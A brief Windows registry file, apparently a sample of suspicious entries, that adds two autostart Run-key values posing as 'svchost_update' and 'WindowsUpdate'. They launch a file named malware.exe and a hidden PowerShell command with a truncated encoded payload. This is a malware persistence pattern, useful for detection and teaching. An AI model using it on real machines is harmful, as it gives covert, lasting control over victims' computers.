Windows Registry Editor Version 5.00

; Suspicious Run keys
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"svchost_update"="C:\\Temp\\malware.exe"
"WindowsUpdate"="powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA..."
